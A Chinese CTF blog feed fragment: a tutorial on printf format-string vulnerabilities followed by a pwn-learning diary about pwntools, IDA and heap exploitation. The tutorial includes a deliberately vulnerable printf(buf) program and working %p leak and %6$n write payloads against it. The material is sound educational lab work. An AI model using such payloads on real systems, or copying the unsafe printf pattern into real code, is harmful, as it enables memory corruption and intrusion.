    <content type="html"><![CDATA[<h1 id="pwn：格式化字符串漏洞"><a href="#pwn：格式化字符串漏洞" class="headerlink" title="pwn：格式化字符串漏洞"></a>pwn：格式化字符串漏洞</h1><p>CTF——PWN的基础漏洞类型。</p><h2 id="1-printf函数的格式化字符串漏洞"><a href="#1-printf函数的格式化字符串漏洞" class="headerlink" title="1 printf函数的格式化字符串漏洞"></a>1 printf函数的格式化字符串漏洞</h2><h3 id="1-1-printf函数"><a href="#1-1-printf函数" class="headerlink" title="1.1 printf函数"></a>1.1 printf函数</h3><p>printf()函数是格式化输出函数, 一般用于向准则输出设备按规定式样输出消息。<br>函数的原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br></code></pre></td></tr></table></figure><p>printf()函数的调用格式为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&lt;格式化字符串&gt;&quot;</span>, &lt;参量表&gt;);<br></code></pre></td></tr></table></figure><p>其中格式化字符串包括两部分内容: 一部分是正常字符, 这些字符将按原样输出; 另一部分是格式化规定字符, 以”%”开始, 后跟一个或几个规定字符,用来确定输出内容格式。参量表是需要输出的一系列参数, 其个数必须与格式化字符串所说明的输出参数个数一样多, 各参数之间用”,”分开, 且顺序一一对应, 否则将会出现意想不到的错误。</p><p>printf()函数的大家族：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">snprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vprintf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vdprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vsprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vsnprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_lis t ap)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>fprintf()按照格式字符串的内容将输出写入流中。三个参数为流、格式字符串和变参列表。</li><li>printf()等同于fprintf()，但是它假定输出流为stdout。 </li><li>sprintf()等同于fprintf()，但是输出不是写入流而是写入数组。在写入的字符串末尾必须添加一个空字符。</li><li>snprintf()等同于sprintf()，但是它指定了可写入字符的最大值size。当size大于零时，输出字符超过第size-1的部分会被舍弃而 不会写入数组中，在写入数组的字符串末尾会添加一个空字符。</li><li>dprintf()等同于fprintf()，但是它输出不是流而是一个文件描述符fd 。</li><li>vfprintf()、vprintf()、vsprintf()、vsnprintf()、vdprintf()分别与上面的函数对应，只是它们将变参列表换成了va_list类型的参数。</li></ul><h3 id="1-2-格式字符串format"><a href="#1-2-格式字符串format" class="headerlink" title="1.2 格式字符串format"></a>1.2 格式字符串format</h3><p>格式字符串是由普通字符（ordinary character，包括 % ）和转换规则（conversion specification）构成的字符序列。普通字符被原封不动地复制到输出流中。转换规则根据与实参对应的转换指示符对其进行转换，然后将结果写入输出流中。<br>一个转换规则有可选部分和必需部分组成：</p><pre><code>%[ 参数 ][ 标志 ][ 宽度 ][ .精度 ][ 长度 ] 转换指示符</code></pre><ul><li>（必需）转换指示符：</li></ul><table><thead><tr><th>字符</th><th align="left">描述</th></tr></thead><tbody><tr><td>d,i</td><td align="left">有符号十进制数值<code>int</code>。<code>%d</code> 与<code>%i </code>对于输出是同义；但对于<code>scanf()</code>输入二者不同，其中<code>%i</code>在输入值有前缀<code>0x</code>或<code>0</code>时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>u</td><td align="left">十进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>f,F</td><td align="left"><code>double</code>型输出10进制定点表示。<code>f </code>与 <code>F</code> 差异是表示无穷与NaN时，<code>f</code>输出<code>inf</code>, <code>infinity</code>与 <code>nan</code>；<code>F</code> 输出<code>INF</code>, <code>INFINITY</code>与<code>NAN</code>。小数点后的数字位数等于精度，最后一位数字四舍五入。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。</td></tr><tr><td>e,E</td><td align="left"><code>double</code>值，输出形式为10进制的<code>([ - ]d.ddd e [ + / - ]ddd)</code>. E版本使用的指数符号为<code>E</code>（而不是<code>e</code>）。指数部分至少包含2位数字，如果值为0，则指数部分为00。Windows系统，指数部分至少为3位数字，例如1.5e002，也可用Microsoft版的运行时函数<code>_set_output_format</code>修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。</td></tr><tr><td>g,G</td><td align="left"><code>double</code>型数值，精度定义为全部有效数字位数。当指数部分在闭区间 [-4,精度] 内，输出为定点形式；否则输出为指数浮点形式。<code>g</code>使用小写字母，<code>G</code>使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。</td></tr><tr><td>x,X</td><td align="left">16进制<code>unsigned int</code>。<code>x</code>使用小写字母；<code>X</code>使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>o</td><td align="left">8进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>s</td><td align="left">如果没有用<code>l</code>标志，输出<code>null</code>结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了<code>l</code>标志，则对应函数参数指向<code>wchar_t</code>型的数组，输出时把每个宽字符转化为多字节字符，相当于调用<code>wcrtomb</code> 函数。</td></tr><tr><td>c</td><td align="left">如果没有用<code>l</code>标志，把<code>int</code>参数转为<code>unsigned char</code>型输出；如果用了<code>l</code>标志，把<code>wint_t</code>参数转为包含两个元素的 <code>chart_t</code>数组，其中第一个元素包含要输出的字符，第二个元素为<code>null</code>宽字符。</td></tr><tr><td>p</td><td align="left">void*型，输出对应变量的值。 <code>printf(&quot;%p&quot;, a)</code>用地址的格式打印变量a的值， printf(“%p”, &amp;a) 打印变量a所在的地址。</td></tr><tr><td>a,A</td><td align="left">double<code>型的16进制表示，</code>[−]0xh.hhhh p±d<code>。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。</code>a<code>使用小写字母，</code>A`使用大写字母。</td></tr><tr><td>n</td><td align="left">不输出字符，但是把已经成功输出的字符个数写入对应的<strong>整型指针参数</strong>所指的变量。</td></tr><tr><td>%</td><td align="left"><code>% </code>字面值，不接受任何除了<code>参数</code>以外的部分。</td></tr></tbody></table><ul><li>（可选）参数 </li></ul><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td><code>n$</code></td><td><code>n</code>是用这个格式说明符显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。如果任意一个占位符使用了参数 ，则其他所有占位符必须也使用参数 。例：<code>printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17)</code> 产生<code>17 0x11; 16 0x10</code></td></tr></tbody></table><p>剩下的略（有用再填）。</p><h3 id="1-3-在pwn中的应用"><a href="#1-3-在pwn中的应用" class="headerlink" title="1.3 在pwn中的应用"></a>1.3 在pwn中的应用</h3><p>看上去好像说，<code>printf</code>这个类型的函数只能输出啊。然而实际上，他有一个有趣的转换指示符，那就是：</p><p><code>%n</code>：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p><p>我们测试一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//printfn.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>a = <span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>,a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1234567890%n\n&quot;</span>,&amp;a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>,a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc printfn.c -o printfn</span><br><span class="hljs-meta">$</span><span class="bash"> ./printfn</span> <br>a = 1<br>1234567890<br>a = 10<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>你看，仅用标准输出语句就成功改写了a的值！</p><p>说到这里已经很清楚了，我们可以通过修改<strong>参数</strong>的值，来改写<strong>该值所对应的地址的值</strong>，使程序执行发生错误。</p><p>比如以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//pwnit.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">80</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">int</span> a = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">int</span> *p = &amp;a;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br><span class="hljs-built_in">printf</span>(buf);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%x\n&quot;</span>,a);<br><span class="hljs-keyword">if</span>(a == <span class="hljs-number">0x10</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you pwn me!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们编译运行一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc pwnit.c -m32 -o pwnit</span><br>pwnit.c: In function ‘main’:<br>pwnit.c:8:9: warning: format not a string literal and no format arguments [-Wformat-security]<br>  printf(buf);<br>         ^<br><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span> <br>abcde<br>abcde<br>5<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>输入abcde似乎根本没用哦。。但是我们可以输入一个字符串看看，<code>int a = 5</code>这个变量声明在哪：</p><p>输入字符串：aaaa-%p-%p-%p-%p-%p-%p-%p-%p</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span><br><span class="hljs-meta">aaaa-%</span><span class="bash">p-%p-%p-%p-%p-%p-%p-%p-%p</span><br>aaaa-0x804a060-0xf75bca60-0x80485db-0x1-0x5-0xfff84494-0x4f3eea00-0xf77413dc-0xfff844c0<br>5<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>这个方法的重点在于：<strong>printf函数的参数是先被压入栈中后获取栈中的值或者地址作为参数的！</strong>当初没有想明白这个问题，困惑了好久。所以，我们发现，第5个参数的值是0x5，说明我们只要把第6个参数<code>（int* p）</code>改成0x10就可以了！</p><p>输入字符串：aaaaaaaaaaaaaaaa%6$n</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span><br><span class="hljs-meta">aaaaaaaaaaaaaaaa%</span><span class="bash">6<span class="hljs-variable">$n</span></span><br>aaaaaaaaaaaaaaaa<br>10<br>you pwn me!<br><span class="hljs-meta">$</span><br></code></pre></td></tr></table></figure><p>成功！</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Daily</title>
    <link href="/2021-06/pwn-Sky-Learning-Daily/"/>
    <url>/2021-06/pwn-Sky-Learning-Daily/</url>
    
    <content type="html"><![CDATA[<h2 id="属于pwn的时间"><a href="#属于pwn的时间" class="headerlink" title="属于pwn的时间:"></a>属于pwn的时间:</h2><h3 id="第0周-6-7-6-13"><a href="#第0周-6-7-6-13" class="headerlink" title="第0周:6/7-6/13"></a>第0周:6/7-6/13</h3><ul><li>11: 为了ida成功把kali2020.3整莫得了, 不想去研究怎么复原了, 直接重装了个kali2021.2, 以后一定弄<strong>快照</strong>.</li><li>12: 弄明白了cachelab的食用方法, 直接ctrlcv代码理解了下, 但是看起来还是有很多可以改进的地方, 暂时看不进去了. <ul><li>typora装的时候apt-key出问题, 其实还能用几年, 更modern的解决办法<a href="https://suay.site/?p=526">在这</a>(还没看).</li><li>问题列表还是Markdown靠谱, 思维导图线太多了, 用不上结构的优势, 除了笔记还是用md吧.</li></ul></li><li>13: 今天计划看看那啥buuoj的题目: 没看懂从哪开始, 还在wiki中<ul><li>typora linux版命令行启动好像有点问题</li><li>啥玩意儿啊, 根本不知道怎么开始做ctf题目-&gt;搞懂了ssh连接到靶机, 结果做到第二题发现是web, 请求学不到家干脆放弃了.</li><li>看了点讲座的内网穿透, 有丶意思, 可惜我没有这种需求</li></ul></li></ul><h3 id="第一周-6-14-6-20"><a href="#第一周-6-14-6-20" class="headerlink" title="第一周:6/14-6/20"></a>第一周:6/14-6/20</h3><ul><li>啥也没干, 复习周</li></ul><h3 id="第二周-6-21-6-27"><a href="#第二周-6-21-6-27" class="headerlink" title="第二周:6/21-6/27"></a>第二周:6/21-6/27</h3><p>……………..</p><h3 id="第一周-7-10-7-11"><a href="#第一周-7-10-7-11" class="headerlink" title="第一周:7/10-7/11"></a>第一周:7/10-7/11</h3><ul><li><strong>10,11: 直接盲选了一手系统安全, 要开始学逆向之类的东西了.</strong> <ul><li>看了看洛神的攻防世界的题解, 看了第一道题我就下载了pwntools ida peda这三个工具, 用了下checksec看看文件的类型, 再试了试nc命令连接到服务器, 运行一下就得到了flag</li><li>第二题是关于格式化字符串漏洞的, 看了老半天, 洛神直接写个很明显, 真不知道他写这个的时候是什么水平, 我还啥都不会呢. 哦对, 我看到一半他居然写了个python, 还是用的pwntools的接口, 人傻了, 明天入门python去, 然后再看看pwntools的python写法</li></ul></li></ul><h3 id="第二周-7-12-7-18"><a href="#第二周-7-12-7-18" class="headerlink" title="第二周:7/12-7/18"></a>第二周:7/12-7/18</h3><ul><li><p><strong>12:这周不做CG了, 开始研究CTF</strong>.</p><ul><li>今天先入门个python先.</li></ul></li><li><p><strong>13: 今天打算学习pwntools的用法</strong>.</p><ul><li>python看到了package,  看过了import, 各种基本类型的用法, 类还没看.</li><li><a href="https://pwntools.readthedocs.io/en/latest/tubes/sockets.html#module-pwnlib.tubes.remote">pwnlib.tubes</a>, 这里有很多东西, 可以直接网页打开然后去搜函数, unpack()和pack()的作用是将数字打包成可输入的字符串</li><li>vscode装python还是挺简单的</li><li><code>%&lt; number&gt;$x</code> 是直接存放到第number个位置的参数，同样可以用在%n，%d等等。<br>但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是%7 $n.<ul><li>在%10n是啥以及为啥要加‘AAAA’这些问题上卡了半天. <a href="https://bbs.pediy.com/thread-253638.htm">[0]</a>.</li><li><strong>除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。</strong> 注意是<strong>对应参数（这个参数是指针）</strong>的对应的地址开始起几个字节。<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">[0]</a>.</li></ul></li></ul></li><li><p><strong>14: IDA东西好多, 也看了看pwntools的文档, 特么也太多了</strong>.(level2整完了, 明天看看文档告别硬编码!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!(先会看再说))</p><ul><li><p><code>var_4 = dword ptr -4；</code>  这是解释代码，可解释成var_4 是 esp - 4处的空间;<br><code>var_0 = dword ptr 8;</code>      var_0 是 esp +8处的空间；</p><p><img src="https://i.loli.net/2021/07/19/LtySjIVDrhfwlk7.png"></p></li><li><p><code>/bin/bash</code>是个好东西, 如果能调用这个可以直接跳转到命令行模式, <code>interactive()</code>打开后就能发命令了</p><p><img src="https://i.loli.net/2021/07/19/TrCMBZjQpANFYhK.png"></p></li><li><p>将悬浮窗口复位: reset the desktop (md变成悬浮窗口就变不回去了??????????)</p><ul><li>芜湖, <strong>savedesktop</strong>还挺好用, 设置了一个我现在水平够用的default</li></ul></li><li><p>shift+F12: <u>strings window</u>.(还有f6,shift+f6,alt+f3)</p></li><li><p>汇编语言<a href="https://blog.csdn.net/weixin_43229030/article/details/106799580#15_comment_field_166">伪指令</a>.   a db 17 dup(?)的<a href="https://zhidao.baidu.com/question/2198876873686806628.html">含义</a>.</p></li><li><p>奇怪的信息: </p><img src="https://i.loli.net/2021/07/19/pYrMl7BxPmhfzUs.png" style="zoom: 50%;" /></li><li><p>python: next()函数和search()的返回是一个可迭代的类型</p></li><li><p><em><strong><u>在32位程序运行中，函数参数直接压入栈中</u></strong></em>,(还能这样???????????????????????????????????)</p><p>(64位汇编传参，当参数少于7个时， 参数<strong>从左到右</strong>放入寄存器: rdi, rsi, rdx, rcx, r8, r9。 当参数为7个以上时，<br>前 6 个与前面一样， 但后面的依次**”从右向左”**放入栈中，即和32位汇编一样。)</p><p>调用函数时栈的结构为:调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;…-&gt;参数1</p></li></ul></li><li><p><strong>15: 上午还是IDA的使用, 下午再看文档. 下午也没看,</strong> .</p><ul><li>return __readfsqword(0x28u) ^ v4; 这个是金丝雀值canary的检测</li><li><u><em>重启大法好</em></u>.(好个屁, 还是没解决)</li><li>千万别把文件名称命名为模块名称, 不然会出错.</li><li>sendlineafter的 <strong>“\n”</strong>一定要看清楚了再加</li><li>函数栈帧的构建过程, <strong>会把ebp推到栈上</strong>.</li><li>看看Jump菜单里的快捷键!</li><li>刚进入函数时, 栈顶是返回地址!</li></ul></li><li><p><strong>16: 今天不知道能做多少, 早上姑且整完了adworld的writeup, 下午晚上看情况, 开始buuoj</strong>, </p><ul><li><p>看了剩下的tutorial, 一些看不懂, 有用到再说吧</p></li><li><p>RWX权限: r代表读权限，w代表写权限，x代表执行权限</p><p>相关的<a href="https://www.runoob.com/linux/linux-comm-chmod.html">chmod命令</a> </p></li><li><p><a href="https://blog.csdn.net/weixin_43655282/article/details/105334313">retn</a>与<em>堆栈平衡</em> (适用于<strong>Ubuntu18</strong>及以上的版本).</p></li></ul></li><li><p><strong>17: 今天在动车上姑且做到了第七题, 并且下载好了LibcSearcher库, 明天开始拿下第七题</strong> </p><ul><li>看懂了python2和python3中的字符串的<a href="https://blog.csdn.net/sinat_38682860/article/details/91046433">区别</a>(复习了<a href="https://www.zhihu.com/question/23374078">Unicode和UTF-8</a>), python3 加上的就是这两种类型<strong>不能混用</strong> </li><li>整明白了eip寄存器(<a href="https://www.cnblogs.com/xiangtingshen/p/11089563.html">1</a>,  <a href="https://www.k2zone.cn/?p=1911">2</a>)和堆栈平衡的东西, 明天再写篇文档顺便整理整理越来越多的md文件.</li></ul></li><li><p><strong>18:整了个blog, hexo+Github</strong>.</p></li></ul><h3 id="第三周-7-19-7-25"><a href="#第三周-7-19-7-25" class="headerlink" title="第三周: 7/19-7/25"></a>第三周: 7/19-7/25</h3><ul><li><p><strong>19: 终于弄完了github上的blog, 以后就这样发东西了</strong> </p><ul><li>python3 -m pydoc -p 0 : 可以查看本地文档</li></ul></li><li><p><strong>20: 白天看python的语法, 看到了formatted_string, 晚上继续做题BUUOJ看LibcSearcher</strong> </p><ul><li><strong><a href="https://yogdzewa.github.io/2021-07/pwn-ROPgadgetDoc/">ROPgadgetDoc</a> or <a href="https://blog.csdn.net/weixin_45556441/article/details/114631043">anotherIntroduce</a></strong> </li><li>**hide的文章可以通过网址访问</li><li>pwn查找字符串的<a href="https://blog.csdn.net/weixin_43921239/article/details/105318835">方法</a>.(指查找程序中的字符串|查找 libc 中的字符串之类的)</li></ul></li><li><p><strong>21: 继续OJ</strong> </p><ul><li>虚拟机里vim的复制粘贴好像有点特别</li><li>今天才做了两道题pwn+babyrop, 我觉得需要反思下到底哪里慢了<ul><li>主要还是想自己摸索, 结果好多东西看别人的学得更快, <strong>又叒叕</strong>复习了一遍%n是修改<strong>指针</strong>指向的值(源自CGfsb), c语言函数有点不太熟悉(strlen就是, 没反应过来是以’\0’为止的, 以及strncmp返回值和第三个参数即长度为0时两个字符串相等), 今天看文档也用了不少时间(fmtstr_payload, flat, pack等), 总的说来学得还算不少, 不过感觉还是有点慢(｀⌒´メ)</li></ul></li></ul></li><li><p><strong>22: 继续</strong> </p><ul><li><p>linux <u>终端suspend问题</u>: pressing the ctrl+z is to suspended current process <a href="https://www.cnblogs.com/jiangzhaowei/p/8971265.html"><strong>[0]</strong></a>.</p></li><li><p>python3 用pwntools什么东西都得加一个b, 绝了. </p><p>“/bin/sh”没加也报错, 还有ELF.search返回的是一个可迭代的对象</p><p>sendlineafter没加b也在那里给警告</p><p>简单题多做几遍还能多几次收获, 哇, 哇</p></li><li><p>IDA 逆向<a href="https://blog.csdn.net/huiguixian/article/details/52026710">常用宏定义</a> </p></li><li><p>pwntools的context默认32位, 还是每次手动设定的好,  推荐使用:<code>context.binary = &#39;./challenge-binary&#39;</code>.</p><img src="https://i.loli.net/2021/07/22/ueHT3S7ComhkflA.png" alt="image-20210722202114278" style="zoom: 67%;" /> </li><li><p>查找字符串-&gt;flag.txt-&gt;Ctrl+X, Jumptothereference-&gt;继续</p></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//常见函数:</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getc</span><span class="hljs-params">(FILE *stream)</span>   <span class="hljs-comment">//返回字符的int类型值</span></span><br><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">fgets</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> n, FILE *stream)</span></span>;  <span class="hljs-comment">//从文件流中读取字符到str中</span><br><span class="hljs-function">FILE *<span class="hljs-title">fopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode)</span></span>;<span class="hljs-comment">//</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> nbyte)</span></span>;<span class="hljs-comment">//一般是write(1,buf,nbyte),stdout = 1</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sys_read</span><span class="hljs-params">(stdinput:<span class="hljs-number">0</span>, buf, size)</span></span><br><span class="hljs-function"><span class="hljs-comment">//习惯上，标准输入的文件描述符是 0，标准输出是 1，标准错误（standard error）是 2。</span></span><br></code></pre></td></tr></table></figure><ul><li><p>bss段原理: executable文件中只记录未初始化变量的起始和终止地址, 在运行时操作系统将这部分内存清零</p></li><li><p>可以直接sendline, 不一定要一直用sendlineafter.</p></li><li><p><strong>23: 还是继续</strong> </p><ul><li>复习了一下<a href="https://www.cnblogs.com/tcctw/p/11333743.html">栈帧对齐</a> </li><li>发现自己对linux的系统函数不熟导致做题不清楚(包括/bin/sh和sh是一样的, 都在系统路径里), 准备重补CSAPP里的Linux函数</li><li><a href="https://blog.csdn.net/zhizhengguan/article/details/112338314">getegid等等</a> </li><li>明天补补CTF-WiKi上的东西, 感觉还挺有用的(因为最新一题要用到fastbin attack……….)</li></ul></li><li><p><strong>24-25: 补补知识</strong> </p><ul><li>复习了下<a href="https://www.cnblogs.com/killerlegend/p/3906502.html">AT&amp;T和Interl语法</a> </li><li>LONG_MAX = INT_MAX</li></ul></li></ul><h3 id="第四周-7-26-8-1"><a href="#第四周-7-26-8-1" class="headerlink" title="第四周: 7/26-8/1"></a>第四周: 7/26-8/1</h3><ul><li><p><strong>26-28: 划水+看CTF-WiKi上的heap内容</strong> </p></li><li><p><strong>29: 继续WiKi</strong> </p><ul><li><p><code>MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</code> </p></li><li><p>我居然还在看WiKi, 关键是他的东西也太多了吧, 之前还以为可以跳过的, 结果全都得倒回去看原理和代码, 这波真的是大意了. 堆的相关内容真的好长</p></li><li><p>fastbin是单链表, 所以元素的用户数据段前八字节有数据, 且是fd</p></li><li><p><strong>fd_nextsize， bk_nextsize</strong>是largebins的指针</p></li><li><pre><code class="c">#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) </code></pre><p>至少包含bk指针, largebins的特有指针可以不要</p></li><li><p>奇了怪了, 看了半天才看出来fastbins里的链表头指针数组的数量是<code>maxsize</code>的字节数, 所以才有<code>fastbin_index(chunksize(victim))</code>这种用字节数定位下标的算法, 好像真的没有一句明白的话说明这玩意儿, 绝了, 看了半天源码才看出来……..</p><p>还是乖乖看源码吧……..</p></li></ul></li><li><p><strong>30:看懂了fastbinattack</strong></p><ul><li>nextchunck是指高地址的那一个</li><li><strong>malloc_consolidate</strong> 